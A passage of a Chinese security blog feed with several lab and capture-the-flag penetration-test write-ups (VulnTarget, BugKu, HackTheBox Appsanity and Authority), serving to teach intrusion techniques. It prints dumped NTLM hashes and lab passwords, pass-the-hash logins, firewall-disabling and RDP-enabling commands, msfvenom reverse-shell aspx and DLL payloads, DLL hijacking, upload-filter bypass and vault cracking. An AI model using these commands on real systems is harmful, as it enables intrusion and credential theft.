668e4f390b4fa54225f4a12106fbceab3056f83c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2016$</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 41061 (00000000:0000a065)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : </span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : 1ee53d0627d3a9c940d6579e3ea1d158</span><br><span class="line">         * SHA1     : 668e4f390b4fa54225f4a12106fbceab3056f83c</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 548857 (00000000:00085ff9)</span><br><span class="line">Session           : CachedInteractive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : WIN2019</span><br><span class="line">Logon Time        : 2023/11/11 22:31:21</span><br><span class="line">SID               : S-1-5-21-3795598892-1521228294-2653055093-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000005] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * NTLM     : c7c654da31ce51cbeecfef99e637be15</span><br><span class="line">         * SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f</span><br><span class="line">         * DPAPI    : 4df31630e621c2278c303c0940d878ff</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : Admin@666</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN2016$</span><br><span class="line">Domain            : VULNTARGET</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2023/11/11 22:29:13</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : WIN2016$</span><br><span class="line">         * Domain   : VULNTARGET</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : win2016$</span><br><span class="line">         * Domain   : VULNTARGET.COM</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br></pre></td></tr></table></figure><p>然后找了这个域管的hash值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[00000005] Primary</span><br><span class="line">* Username : Administrator</span><br><span class="line">* Domain   : VULNTARGET</span><br><span class="line">* NTLM     : c7c654da31ce51cbeecfef99e637be15</span><br><span class="line">* SHA1     : 20045722851488e55f32110eb0a5222ba793fe2f</span><br><span class="line">* DPAPI    : 4df31630e621c2278c303c0940d878ff</span><br></pre></td></tr></table></figure><p>因为这个域管在10段  所以得上二级代理</p><p><a href="https://www.freebuf.com/sectool/359841.htmlStowaway">https://www.freebuf.com/sectool/359841.htmlStowaway</a></p><p>早win7机器上再开一个端口</p><p><img src="../images/image-20231113111634856.png" alt="image-20231113111634856"></p><p>然后使用win16机器连接这个端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -c 10.0.20.128:1235</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113111804433.png" alt="image-20231113111804433"></p><p><img src="../images/image-20231113111823827.png" alt="image-20231113111823827"></p><p>然后给proxifier再加上一条规则</p><p><img src="../images/image-20231113111851438.png" alt="image-20231113111851438"></p><p>再proxychains这个配置文件上再加上这一条就行了</p><p><img src="../images/image-20231113111938654.png" alt="image-20231113111938654"></p><p>因为我们获取了域管的hash值  那么我们就直接evil-winrm登录就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains evil-winrm -i 10.0.10.110 -u Administrator -H &quot;c7c654da31ce51cbeecfef99e637be15&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113112046978.png" alt="image-20231113112046978"></p><p>拿下了</p><p>最后讲一下怎么再没开启3389的情况下开启3389端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><p>这里得获取到域控之后才有权限</p><p>(这里我没尝试成功  先存着  以后可能有用)</p><p><img src="../images/image-20231113113141354.png" alt="image-20231113113141354"></p><p>就是第二步的时候出错</p><p>关闭防火墙命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p>新的知识点就是学会了这个 二级代理</p><p><img src="../images/image-20231113113913305.png" alt="image-20231113113913305"></p><p><strong>二级代理同样能上 viper  但是注意的一点就是 防火墙必须得关掉</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113114204412.png" alt="image-20231113114204412"></p><p><img src="../images/image-20231113114152747.png" alt="image-20231113114152747"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;192.168.52.132  外网目标ip&lt;/p&gt;
&lt;p&gt;fscan扫一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>BugKu-渗透测试3</title>
    <link href="https://ke1nys.github.io/posts/93f2eacf.html"/>
    <id>https://ke1nys.github.io/posts/93f2eacf.html</id>
    <published>2023-11-10T08:38:39.000Z</published>
    <updated>2023-12-06T02:51:48.623Z</updated>
    
    <content type="html"><![CDATA[<p>内网只有linux机器   不是域的</p><p>拿到一个ip  开始fscan和nmap扫一下</p><p><img src="../images/image-20231110164843323.png" alt="image-20231110164843323"></p><p>这里的话一共就是三个端口  这里的这个2376端口没啥用  本来是想着docker -H上的  结果发现不行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.116.19.50:2376 ps</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231110165410384.png" alt="image-20231110165410384"></p><p><img src="../images/image-20231110165355531.png" alt="image-20231110165355531"></p><p>发现其会访问我们的网站  于是看看能不能打ssrf或者用除了http以外的协议来尝试</p><p><img src="../images/image-20231110165510319.png" alt="image-20231110165510319"></p><p>这样是可以的  接下来尝试ssrf  先使用file协议来读取一下 内网网络地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/hosts</span><br><span class="line"></span><br><span class="line">/etc/network/interfaces  /proc/net/arp  (权限高的情况下读取)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231110165805753.png" alt="image-20231110165805753"></p><p>发现一个<code>192.168.0.2</code>的地址  刚开始我是想着<code>dict://</code>协议去探测内网端口 然后来打ssrf 加xxx服务进入内网的  但是这里发现不行  于是尝试使用http协议来对该地址进行C段的爆破<strong>(其实本质上就是看80端口是否开了服务)</strong></p><p><img src="../images/image-20231110170241638.png" alt="image-20231110170241638"></p><p><img src="../images/image-20231110170555233.png" alt="image-20231110170555233"></p><p>扫出来的地址的话一共是有5个的  并且都是开启了服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.1</span><br><span class="line">192.168.0.2</span><br><span class="line">(快照)</span><br><span class="line"></span><br><span class="line">192.168.0.10  葫芦娃</span><br><span class="line"></span><br><span class="line">192.168.0.138  ID查询</span><br><span class="line"></span><br><span class="line">192.168.0.250  用户登录</span><br></pre></td></tr></table></figure><p>这是着5个端口的作用  先去访问这个葫芦娃地址  因为这个地址题目提示了说是被黑了  并且留有后门</p><p><img src="../images/image-20231110170839212.png" alt="image-20231110170839212"></p><p>直接访问shell.php就行  (猜出来的)</p><p><img src="../images/image-20231110170920455.png" alt="image-20231110170920455"></p><p>能命令执行  直接上stowaway  来设置代理</p><p><img src="../images/image-20231110171044391.png" alt="image-20231110171044391"></p><p>wget下载下来</p><p><img src="../images/image-20231110171120623.png" alt="image-20231110171120623"></p><p>记得加上可执行权限 <strong>(命令要记得URL编码)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod%20%2Bx%20linux_x64_agent</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231110171526998.png" alt="image-20231110171526998"></p><p>上了可执行权限了  然后执行上代理就行了 </p><p><img src="../images/image-20231110171721135.png" alt="image-20231110171721135"></p><p><img src="../images/image-20231110171731300.png" alt="image-20231110171731300"></p><p>然后挂代理  开proxifier就行了</p><p>直接写个马用蚁剑来连这个葫芦娃的网站</p><p><img src="../images/image-20231110172138656.png" alt="image-20231110172138656"></p><p><img src="../images/image-20231110172227570.png" alt="image-20231110172227570"></p><p>根目录和当前目录是各一个flag的</p><p><img src="../images/image-20231110172319251.png" alt="image-20231110172319251"></p><p><img src="../images/image-20231110172532590.png" alt="image-20231110172532590"></p><p>发现其还有一个网卡的 <code>10.10.0.5</code>   但是这里的话fscan是扫不了的  因为icmp协议不能用  说权限不够</p><p>等一会再来看这个 10网卡  先打完192这个网卡</p><p>接下来是打这个 <code>192.168.0.138</code>、</p><p><img src="../images/image-20231110172622487.png" alt="image-20231110172622487"></p><p>感觉sqlmap就能跑了  于是抓包破sqlmap</p><p><img src="../images/image-20231110172742465.png" alt="image-20231110172742465"></p><p>直接跑出  但是这里我在尝试这个<code>--os-shell</code>的时候呢 发现是写不了马的  然后就去打最后一个地址<code>192.168.0.250</code></p><p><img src="../images/image-20231110172856806.png" alt="image-20231110172856806"></p><p>弱口令直接登录  <code>admin/admin</code></p><p><img src="../images/image-20231110172917552.png" alt="image-20231110172917552"></p><p>这里是没有跳转的 所以很奇怪  抓个包看看</p><p><img src="../images/image-20231110173031364.png" alt="image-20231110173031364"></p><p>盲猜打一手xxe</p><p><img src="../images/image-20231110173150156.png" alt="image-20231110173150156"></p><p><img src="../images/image-20231110173211897.png" alt="image-20231110173211897"></p><p>这里就剩我们刚开始看的最后一个那个10网卡的  就去看看他</p><p>因为这里不能fscan来扫内网的c段  然后就想着既然能访问这个10.10.0.5服务 那么蚁剑连他  看看会不会有什么不同</p><p><img src="../images/image-20231110175104100.png" alt="image-20231110175104100"></p><p>写了个脚本来跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    url = f&#x27;http://10.10.0.&#123;i&#125;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        res = requests.get(url=url, timeout=1)</span><br><span class="line">        if res.status_code == 200:</span><br><span class="line">            print(f&#x27;Host &#123;url&#125; is reachable (Status Code: 200)&#x27;)</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        # 处理连接超时异常，忽略其他异常</span><br><span class="line">        if isinstance(e, requests.exceptions.ConnectTimeout):</span><br><span class="line">            continue</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的<code>http://10.10.0.1</code>是刚开始的快照</p><p><code>http://10.10.0.5</code> 是葫芦娃</p><p><code>http://10.10.0.22</code> 这个是新的目标</p><p><img src="../images/image-20231110175245780.png" alt="image-20231110175245780"></p><p>目录扫描一下</p><p><img src="../images/image-20231110175501542.png" alt="image-20231110175501542"></p><p>访问后台  还是admin/admin弱口令登录</p><p><img src="../images/image-20231110175605040.png" alt="image-20231110175605040"></p><p><img src="../images/image-20231110175631764.png" alt="image-20231110175631764"></p><p>随意上传个马子上去   然后连蚁剑</p><p><img src="../images/image-20231110175903219.png" alt="image-20231110175903219"></p><p>拿下全部机器  </p><p>渗透结束</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;内网只有linux机器   不是域的&lt;/p&gt;
&lt;p&gt;拿到一个ip  开始fscan和nmap扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231110164843323.png&quot; alt=&quot;image-20231110164843323&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="BugKu" scheme="https://ke1nys.github.io/tags/BugKu/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Appsanity</title>
    <link href="https://ke1nys.github.io/posts/bd403fe1.html"/>
    <id>https://ke1nys.github.io/posts/bd403fe1.html</id>
    <published>2023-11-08T11:14:39.000Z</published>
    <updated>2023-12-06T02:51:48.625Z</updated>
    
    <content type="html"><![CDATA[<p>正向代理是 被控机器监听端口  监听的端口是我们vps上开的socks的端口</p><p>方向代理是  被控机器将其自身的端口转发出来</p><p>先fscan和nmap扫一下</p><p><img src="../images/image-20231108192629726.png" alt="image-20231108192629726"></p><p><img src="../images/image-20231108192648540.png" alt="image-20231108192648540"></p><p>就三个端口 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80 443 5985 (135 139那些端口根本用不了了 )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里说一下这个前期信息收集步骤</p><ul><li>先是fscan和nmap跑一下</li><li>然后dirsearch开扫</li><li>子域名扫描 ffuf</li><li>smb默认尝试一下  看看会不会能匿名登录</li></ul><p>访问80端口</p><p><img src="../images/image-20231108211431612.png" alt="image-20231108211431612"></p><p>一个普通的页面  扫路径没发现什么东西  直接去注册个账号来进行登录</p><p><img src="../images/image-20231108211711179.png" alt="image-20231108211711179"></p><p>登录是个病人后台  抓包看看注册流程  看看是不是存在可以动手脚的地方来获取到别的账户</p><p><strong>(这里抓这个https的包的话 记得要导入证书 )</strong></p><p><img src="../images/image-20231108212109078.png" alt="image-20231108212109078"></p><p>这里的话是修改为2就行了  这样的话创建的账户就是医生的了</p><p><img src="../images/image-20231108212201552.png" alt="image-20231108212201552"></p><p>直接去登录</p><p><img src="../images/image-20231108212407944.png" alt="image-20231108212407944"></p><p>这里的话是没有发现什么东西  然后去扫一下子域名<strong>(其实这里的话应该是前期准备的时候就应该干的了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ./subdomains-top1million-5000.txt -u &quot;https://meddigi.htb/&quot; -H &#x27;Host: FUZZ.meddigi.htb&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231108212620927.png" alt="image-20231108212620927"></p><p>记得将这个域名添加到hosts里面  不然会访问不了</p><p><img src="../images/image-20231108212756351.png" alt="image-20231108212756351"></p><p>用我们刚刚登录的医生的cookie来试试</p><p><img src="../images/image-20231108212956508.png" alt="image-20231108212956508"></p><p>Cookie成功复用登录后台  然后尝试挨个看看功能点有没有洞</p><p><img src="../images/image-20231108213141207.png" alt="image-20231108213141207"></p><p>这里的话有个功能是可以访问我们输入的url地址  </p><p><img src="../images/image-20231108213209697.png" alt="image-20231108213209697"></p><p>我们尝试看看可不可以打ssrf  抓包看看</p><p><img src="../images/image-20231108213615793.png" alt="image-20231108213615793"></p><p>在<code>127.0.0.1</code>的8080确实是可以返回结果的  并且还会返回有个pdf文件</p><p>在另一个功能点处  我们发现有一个文件上传的功能</p><p><img src="../images/image-20231108213955131.png" alt="image-20231108213955131"></p><p>这里经过测试  是发现只能上传这个PDF文件的 <strong>(经过我们测试呢  发现这里的话是可以通过文件头来绕过的 应该是后端写的时候只写了这个检测文件内容)</strong></p><p><img src="../images/image-20231108214131058.png" alt="image-20231108214131058"></p><p>然后再去访问一下  看看有没有上传成功</p><p><img src="../images/image-20231108214206516.png" alt="image-20231108214206516"></p><p>成功上传成功  这里的话是aspx文件  那么我们使用msf来生成一个恶意的aspx文件来上马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.21 LPORT=6666 -f aspx -o shell.aspx</span><br><span class="line">(上传马的时候记得也加上PDF文件头  不然也会上传失败)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8080/ViewReport.aspx?file=15fe5ae9-255f-4d40-9431-71bae8a69aa9_shell.aspx</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_https</span><br><span class="line">set LHOST 10.10.14.21</span><br><span class="line">set LPORT 6666</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231108214652406.png" alt="image-20231108214652406"></p><p><img src="../images/image-20231108214714031.png" alt="image-20231108214714031"></p><p>上传成功  复制该路径并且访问</p><p><img src="../images/image-20231108214832803.png" alt="image-20231108214832803"></p><p>收到shell</p><p><img src="../images/image-20231108214940598.png" alt="image-20231108214940598"></p><p>一通瞎逛</p><p><img src="../images/image-20231108215240785.png" alt="image-20231108215240785"></p><p>发现<code>C:\inetpub\ExaminationPanel\ExaminationPanel\bin&gt;</code>这个路径下的<code>ExaminationManagement.dll</code>文件里面有有用的信息</p><p>下载下来dnspy打开查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download C:\\inetpub\\ExaminationPanel\\ExaminationPanel\\bin\\ExaminationManagement.dll</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231108215546556.png" alt="image-20231108215546556"></p><p>反编译查看中发现其读取了注册表里的这个东西  于是跟进读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\Software\MedDigi</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231108215642031.png" alt="image-20231108215642031"></p><p><code>1g0tTh3R3m3dy!!</code></p><p>于是去users目录下挨个查看用户  并且挨个试试哪个能登录</p><p><img src="../images/image-20231108215806895.png" alt="image-20231108215806895"></p><p>最后发现这个用户是可以成功登录的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.238 -u devdoc -p &#x27;1g0tTh3R3m3dy!!&#x27;</span><br></pre></td></tr></table></figure><p>瞎逛一下  发现安装文件目录下存在一个和upload report处差不多的一个exe文件  我们尝试下载下来反编译查看</p><p><code>download ReportManagement.exe</code></p><p><img src="../images/image-20231108220501207.png" alt="image-20231108220501207"></p><p>然后就猜测  是不是在文件上传的时候  会调用的<code>externalupload</code>这个dll文件</p><p>但是当我们访问这个目录的时候 却发现没有这个文件  于是我们猜测  是不是dll劫持</p><p><a href="https://xz.aliyun.com/t/11711#toc-3">https://xz.aliyun.com/t/11711#toc-3</a>   (浅显易懂)</p><p>于是我们使用 <code>icacls Libraries</code>命令来查看我们是否有写入这个文件夹的权限</p><p><img src="../images/image-20231108220756449.png" alt="image-20231108220756449"></p><p>发现我们当前devdoc用户是有这个权限的  所以我们就尝试进行写个恶意的dll文件上传上去来进行dll劫持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f dll -o externalupload.dll</span><br><span class="line"></span><br><span class="line">//生成恶意的dll文件</span><br><span class="line"></span><br><span class="line">然后进行端口转发到本地来进行操作  这里为啥是100端口我也不知道</span><br><span class="line">kali执行  chisel server --port 8888 --reverse</span><br><span class="line">windows执行  ./chisel.exe client 10.10.14.21:8888 R:100:127.0.0.1:100</span><br><span class="line"></span><br><span class="line">这里的话是将远程主机的100端口转发到本地  那么我们访问本地的100端口就相当于访问远程的100端口</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231108223105100.png" alt="image-20231108223105100"></p><p>然后<code>nc 127.0.0.1 100</code>    随便<code>upload xxx</code>就行   这样的话就会触发到我们上传的恶意的dll文件</p><p><img src="../images/image-20231108223159193.png" alt="image-20231108223159193"></p><p><img src="../images/image-20231108223221004.png" alt="image-20231108223221004"></p><p>总结一下———————————发现了这里的话是越难的靶机都会用到逆向方面的知识点</p><p>知识点：子域名探测&amp;Cookie复用&amp;SSRF配合文件上传绕过魔术头getshell；逆向dll&amp;exe；DLL劫持提权。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;正向代理是 被控机器监听端口  监听的端口是我们vps上开的socks的端口&lt;/p&gt;
&lt;p&gt;方向代理是  被控机器将其自身的端口转发出来&lt;/p&gt;
&lt;p&gt;先fscan和nmap扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-2023110819262</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://ke1nys.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Authority</title>
    <link href="https://ke1nys.github.io/posts/cd01b188.html"/>
    <id>https://ke1nys.github.io/posts/cd01b188.html</id>
    <published>2023-11-07T12:56:34.000Z</published>
    <updated>2023-11-07T14:23:59.800Z</updated>
    
    <content type="html"><![CDATA[<p>还是先扫一下  这里是推荐fscan和nmap同时扫  这样获取到的信息能多点</p><p><img src="../images/image-20231107210225491.png" alt="image-20231107210225491"></p><p><img src="../images/image-20231107210430826.png" alt="image-20231107210430826"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一共就是80 5985 8433 这个三个端口 其他端口一般是默认就开的</span><br><span class="line">域名 authority.htb</span><br><span class="line">80端口是个IIS服务器</span><br><span class="line">目标机器是个win主机</span><br></pre></td></tr></table></figure><p>收集到这些信息后  访问这个80端口的话是啥也没的 </p><p><img src="../images/image-20231107210816937.png" alt="image-20231107210816937"></p><p>然后就从其他方面入手  先尝试一下看看能不能匿名登录smb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.11.222 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107211019730.png" alt="image-20231107211019730"></p><p>只有这两个地方是我们能够访问的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.222/Department Shares/</span><br><span class="line"></span><br><span class="line">smbclient //10.10.11.222/vv/</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107211104961.png" alt="image-20231107211104961"></p><p>这里的话就发现只有Development这个共享文件夹能够访问到</p><p><img src="../images/image-20231107211201753.png" alt="image-20231107211201753"></p><p>开始查看看有哪些东西可以进行利用</p><p><img src="../images/image-20231107211329255.png" alt="image-20231107211329255"></p><p>这个文件夹名字的话  百度一下就会发现他是个配置管理工具  </p><blockquote><p>Ansible是一个开源配置管理工具，可以使用它来自动化任务，部署应用程序实现IT基础架构。Ansible可以用来自动化日常任务，比如，服务器的初始化配置、安全基线配置、更新和打补丁系统，安装软件包等</p></blockquote><p>那么我们就把其下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">recurse on 表明开启循环</span><br><span class="line"></span><br><span class="line">prompt off 表明关闭提示询问</span><br><span class="line"></span><br><span class="line">mget * 表示下载该目录下的所有文件</span><br></pre></td></tr></table></figure><p>然后开始查看这个文件下的目录</p><p><img src="../images/image-20231107211754056.png" alt="image-20231107211754056"></p><p>跟进这个PWM目录下就会发现  这是一个服务</p><blockquote><p>PWM（Password Management for LDAP Directory Services）可能是一种用于管理密码和凭证的系统，特别是用于与LDAP目录服务（例如OpenLDAP）一起使用。这可以包括密码策略管理、密码重置、自助服务、密码保险柜等功能，以帮助组织更好地管理用户凭证和密码策略。</p></blockquote><p><img src="../images/image-20231107211902199.png" alt="image-20231107211902199"></p><p>在这个目录下就会发现存在有些被vault加密过的字符串  然后我们就将其保存下来并爆破他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先保存在1.yml文件中</span><br><span class="line"></span><br><span class="line">ansible2john 1.yml &gt; vault1.in</span><br><span class="line">然后转化为可爆破的形式</span><br><span class="line">(这里选哪个字符串结果都是一样的  其实爆破加密字符串的实质都是爆破其外层加密的密码)</span><br><span class="line"></span><br><span class="line">然后再使用hashcat进行爆破</span><br><span class="line"></span><br><span class="line">hashcat -a 0 -m 16900 --force vault1.in /home/ke1nys/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107212217521.png" alt="image-20231107212217521"></p><p>这里获取到的密码和上面的password啥关系都没  本质上就是加密的密码</p><p>我们通过获取到这个加密密码后   我们就可以通过其来进行解密获取到的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ansible localhost -m debug -a var=&quot;ldap_admin_password&quot; -e &quot;@Ansible/PWM/defaults/main.yml&quot; --vault-password-file=.vault_password</span><br><span class="line"></span><br><span class="line">//这里的话是将我们爆破出得到的密码存入到.vault_password中 也就是!@#$%^&amp;*</span><br><span class="line">//还有-e那里必须得写全路径  不然会报错 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107213115052.png" alt="image-20231107213115052"></p><p>三个挨个试就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwm_admin_password:  pWm_@dm!N_!23</span><br><span class="line"></span><br><span class="line">&quot;pwm_admin_login&quot;: 